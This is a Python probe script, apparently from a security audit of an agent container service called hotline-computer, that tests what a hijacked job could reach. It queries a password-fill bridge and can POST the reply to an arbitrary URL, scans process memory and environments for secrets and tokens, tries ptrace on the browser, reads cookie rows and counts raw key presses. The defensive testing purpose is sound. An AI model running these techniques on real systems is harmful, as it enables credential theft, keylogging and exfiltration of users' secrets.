#!/usr/bin/env python3
"""Job-side probes, run inside the container as the agent's own uid, the way a
steered job would. Ported from hl-secret-audit/tools (bridge.py, askme_job.py,
memscan.py) and hl-secret-design/job_probes.sh (X1-X7).

usage: job.py bridge <fill|logins|get|askme> [timeout]   print the raw reply, base64'd
       job.py plain <op>                                  print the raw reply (the tool answer redacts it)
       job.py post <url> [fill|askme]                     ask the bridge and POST the reply to <url>
       job.py memscan <needle>... [--rev <reversed needle>...]  scan hotline* processes' memory
       job.py scan <reversed needle>...                  count job logs and readable /proc/*/environ holding one
       job.py proc                                       the X1-X7 and B6 checks, as key=value lines
       job.py cookies                                    read signed-in cookie rows from the browser profile
       job.py xi2 <seconds>                              count raw key presses seen on the display
Nothing here prints a secret in plain: replies are base64'd so only the harness reads them.
"""
import base64
import ctypes
import ctypes.util
import glob
import hashlib
import json
import os
import socket
import sys
import time
import urllib.request

SOCKS = ["/tmp/hotline-computer/bridge.sock", "/run/hotline-computer/bridge/bridge.sock"]


def b64(s):
    return base64.b64encode(s if isinstance(s, bytes) else s.encode()).decode()


def ask(message, timeout=8):
    last = "NOSOCKET"
    for path in SOCKS:
        s = socket.socket(socket.AF_UNIX)
        s.settimeout(timeout)
        try:
            s.connect(path)
        except Exception as e:
            last = "CONNECT-" + type(e).__name__ + "-" + str(getattr(e, "errno", ""))
            continue
        s.sendall((json.dumps(message) + "\n").encode())
        buf = b""
        try:
            while not buf.endswith(b"\n"):
                chunk = s.recv(65536)
                if not chunk:
                    break
                buf += chunk
        except Exception as e:
            return "TIMEOUT-" + type(e).__name__
        return buf.decode().strip()
    return last


MESSAGES = {
    "fill": {"kind": "fill", "origin": "https://example.test", "name": "EXAMPLE"},
    "logins": {"kind": "logins", "origin": "https://example.test"},
    "get": {"kind": "get", "details": {
        "rpId": "example.test", "challenge": "YXR0YWNrZXItY2hvc2VuLWNoYWxsZW5nZQ", "allowCredentials": [],
        "extensions": {"remoteDesktopClientOverride": {"origin": "https://example.test",
                                                       "sameOriginWithAncestors": True}}}},
    "askme": {"kind": "fill", "origin": "https://example.test", "name": "ASKME"},
}


def bridge(op, timeout):
    print("REPLY", b64(ask(MESSAGES[op], timeout)))


def plain(op):
    print(ask(MESSAGES[op], 8))


def post(url, op):
    reply = ask(MESSAGES[op], 200)
    try:
        urllib.request.urlopen(urllib.request.Request(url, data=reply.encode(), method="POST"), timeout=5).read()
    except Exception as e:
        print("POSTFAIL", type(e).__name__)
    print("DONE")


def unreversed(args):
    """Needles after --rev come reversed, so the command line that carried
    them (kept by the runner that started this job) never holds them."""
    if "--rev" not in args:
        return args
    at = args.index("--rev")
    return args[:at] + [n[::-1] for n in args[at + 1:]]


def scan(needles):
    needles = [n[::-1].encode() for n in needles]
    logs = 0
    for path in glob.glob(os.path.expanduser("~/.hotline/jobs/*/*.log")):
        try:
            data = open(path, "rb").read()
        except Exception:
            continue
        logs += any(n in data for n in needles)
    environ = 0
    for pid in [p for p in os.listdir("/proc") if p.isdigit()]:
        try:
            data = open(f"/proc/{pid}/environ", "rb").read()
        except Exception:
            continue
        environ += any(n in data for n in needles)
    print(f"SCAN logs={logs} environ={environ}")


def memscan(needles):
    needles = [n.encode() for n in unreversed(needles)]
    for pid in [p for p in os.listdir("/proc") if p.isdigit()]:
        try:
            comm = open(f"/proc/{pid}/comm").read().strip()
        except Exception:
            continue
        if not comm.startswith("hotline"):
            continue
        try:
            comm = open(f"/proc/{pid}/cmdline", "rb").read().replace(b"\0", b" ").decode().split()[1]
        except Exception:
            pass
        try:
            maps = open(f"/proc/{pid}/maps").read().splitlines()
            mem = open(f"/proc/{pid}/mem", "rb", 0)
        except Exception as e:
            print(f"MEMSCAN {pid} {comm} DENIED {type(e).__name__}")
            continue
        hits = 0
        for line in maps:
            addr, perm = line.split()[0], line.split()[1]
            if "r" not in perm:
                continue
            start, end = [int(x, 16) for x in addr.split("-")]
            if end - start > 256 * 1024 * 1024:
                continue
            try:
                mem.seek(start)
                buf = mem.read(end - start)
            except Exception:
                continue
            hits += sum(1 for n in needles if n in buf)
        print(f"MEMSCAN {pid} {comm} HITS {hits}")


def readable(path, n=1):
    try:
        with open(path, "rb") as f:
            return len(f.read(n)) > 0
    except Exception:
        return False


def proc():
    service = []
    for p in os.listdir("/proc"):
        try:
            cmd = open(f"/proc/{p}/cmdline", "rb").read().split(b"\0")
        except Exception:
            continue
        if p.isdigit() and cmd[0].endswith(b"hotline-computer") and cmd[1:2] == [b"boot"]:
            service.append(p)
    chromium = None
    for p in os.listdir("/proc"):
        if p.isdigit():
            try:
                cmd = open(f"/proc/{p}/cmdline", "rb").read().split(b"\0")
            except Exception:
                continue
            line = b" ".join(cmd)
            if b"/chromium" in line.split(b" ")[0] and b"--remote-debugging-port=9222" in line and b"--type=" not in line:
                chromium = p
                break
    # X1: the service's private files
    files = [p for p in glob.glob("/tmp/hotline-computer/*") + glob.glob("/run/hotline-computer/broker/*")
             if os.path.isfile(p)]
    print("X1", ",".join(os.path.basename(p) for p in files if readable(p)) or "none")
    # X2 / B6: the service's environment and memory; the bearer in any environ
    mine = os.getpid()
    x2e = any(readable(f"/proc/{p}/environ") for p in service)
    x2m = any(readable(f"/proc/{p}/mem") for p in service)
    print("X2", f"environ={x2e} mem={x2m} pids={','.join(service)}")
    tokens = []
    for p in os.listdir("/proc"):
        if p.isdigit() and int(p) != mine:
            try:
                for kv in open(f"/proc/{p}/environ", "rb").read().split(b"\0"):
                    if kv.startswith(b"HOTLINE_COMPUTER_TOKEN="):
                        tokens.append(hashlib.sha256(kv.split(b"=", 1)[1]).hexdigest())
            except Exception:
                pass
    print("B6", ",".join(tokens) or "none")
    # X3 / X4: the browser
    if chromium:
        print("X3", f"pid={chromium} environ={readable(f'/proc/{chromium}/environ')} mem={readable(f'/proc/{chromium}/mem')}")
        libc = ctypes.CDLL(None, use_errno=True)
        r = libc.ptrace(16, int(chromium), 0, 0)
        err = os.strerror(ctypes.get_errno())
        if r == 0:
            # Attached: let it stop, then detach and continue so the browser is left as found.
            libc.waitpid(int(chromium), None, 0x40000000)
            libc.ptrace(17, int(chromium), 0, 0)
            os.kill(int(chromium), 18)
        print("X4", f"attach={'ok' if r == 0 else 'refused'} {err}")
    else:
        print("X3 nochromium")
        print("X4 nochromium")
    # X5: the bridge socket
    res = "refused"
    for path in SOCKS:
        s = socket.socket(socket.AF_UNIX)
        s.settimeout(3)
        try:
            s.connect(path)
            res = "connected " + path
            break
        except Exception as e:
            res = f"refused {type(e).__name__}"
    print("X5", res)
    # X6: any DevTools port
    try:
        v = urllib.request.urlopen("http://127.0.0.1:9222/json/version", timeout=3).read().decode()
        print("X6", "answered" if "webSocketDebuggerUrl" in v else "odd")
    except Exception as e:
        print("X6", "refused " + type(e).__name__)
    # X7: signal the service (signal 0 only: it checks permission and kills nothing)
    ok = False
    for p in service:
        try:
            os.kill(int(p), 0)
            ok = True
        except Exception:
            pass
    print("X7", "may-signal" if ok else "refused")


def cookies():
    import shutil
    import sqlite3
    for _ in range(60):
        try:
            shutil.copy(os.path.expanduser("~/.hotline/browser/Default/Cookies"), "/tmp/ck.db")
            rows = sqlite3.connect("/tmp/ck.db").execute(
                "select host_key,length(value),length(encrypted_value) from cookies where host_key like '%example.test'").fetchall()
        except Exception as e:
            print("COOKIES error", type(e).__name__)
            return
        if rows:
            print("COOKIES row", rows)
            return
        time.sleep(1)
    print("COOKIES norow")


def xi2(seconds):
    x11 = ctypes.CDLL(ctypes.util.find_library("X11"))
    xi = ctypes.CDLL(ctypes.util.find_library("Xi"))
    x11.XOpenDisplay.restype = ctypes.c_void_p
    x11.XOpenDisplay.argtypes = [ctypes.c_char_p]
    d = x11.XOpenDisplay(None)
    if not d:
        print("XI2 noconnect")
        return
    x11.XDefaultRootWindow.restype = ctypes.c_ulong
    x11.XDefaultRootWindow.argtypes = [ctypes.c_void_p]
    root = x11.XDefaultRootWindow(d)
    op, ev, er = ctypes.c_int(), ctypes.c_int(), ctypes.c_int()
    x11.XQueryExtension(ctypes.c_void_p(d), b"XInputExtension", ctypes.byref(op), ctypes.byref(ev), ctypes.byref(er))
    maj, mnr = ctypes.c_int(2), ctypes.c_int(0)
    xi.XIQueryVersion(ctypes.c_void_p(d), ctypes.byref(maj), ctypes.byref(mnr))

    class Mask(ctypes.Structure):
        _fields_ = [("deviceid", ctypes.c_int), ("mask_len", ctypes.c_int), ("mask", ctypes.POINTER(ctypes.c_ubyte))]

    bits = (ctypes.c_ubyte * 4)()
    bits[13 >> 3] |= 1 << (13 & 7)  # XI_RawKeyPress
    m = Mask(1, 4, bits)  # XIAllMasterDevices
    xi.XISelectEvents(ctypes.c_void_p(d), ctypes.c_ulong(root), ctypes.byref(m), 1)
    x11.XFlush(ctypes.c_void_p(d))
    print("XI2 listening", flush=True)
    event = ctypes.create_string_buffer(192)
    count = 0
    end = time.time() + float(seconds)
    while time.time() < end:
        while x11.XPending(ctypes.c_void_p(d)):
            x11.XNextEvent(ctypes.c_void_p(d), event)
            if ctypes.c_int.from_buffer(event, 0).value == 35 and x11.XGetEventData(ctypes.c_void_p(d), event):
                if ctypes.c_int.from_buffer(event, 36).value == 13:
                    count += 1
                x11.XFreeEventData(ctypes.c_void_p(d), event)
        time.sleep(0.05)
    print("XI2 rawkeys", count)


if __name__ == "__main__":
    cmd = sys.argv[1]
    if cmd == "bridge":
        bridge(sys.argv[2], float(sys.argv[3]) if len(sys.argv) > 3 else 8)
    elif cmd == "plain":
        plain(sys.argv[2])
    elif cmd == "post":
        post(sys.argv[2], sys.argv[3] if len(sys.argv) > 3 else "askme")
    elif cmd == "memscan":
        memscan(sys.argv[2:])
    elif cmd == "scan":
        scan(sys.argv[2:])
    elif cmd == "proc":
        proc()
    elif cmd == "cookies":
        cookies()
    elif cmd == "xi2":
        xi2(sys.argv[2])
